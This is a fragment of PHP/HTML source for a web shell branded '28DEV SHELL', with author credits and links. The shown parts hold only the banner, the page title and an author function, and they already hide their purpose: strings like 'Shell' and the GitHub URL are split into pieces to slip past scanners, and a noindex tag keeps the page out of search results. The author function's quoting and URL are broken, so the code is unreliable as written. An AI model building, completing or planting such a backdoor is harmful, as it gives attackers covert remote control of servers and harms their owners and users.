<!--- Name     : 28DEV SHELL                            --->
<!--- Github   : https://github.com/dvreux   --->
<!--- Telegram : @28Dev                                 --->
<!DOCTYPE html>
<html>
<head>
	<?php echo "<title>28"."Dev"." Sh"."el"."l</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://imgur.com/a/csPmdME" type="image/x-icon">
</head>
...
<center>
<?php
echo '<font face="Bungee" size="5">28'.'Dev'.' Sh'.'el'.'l</font></center>
...
function author() {
	echo "<center><br>28"."Dev"<br><a href='https://gi"."th"."hub".".com"."dv"."re"."ux".' target='_blank'>"28"."Dev".</a></center>";
	exit();
}
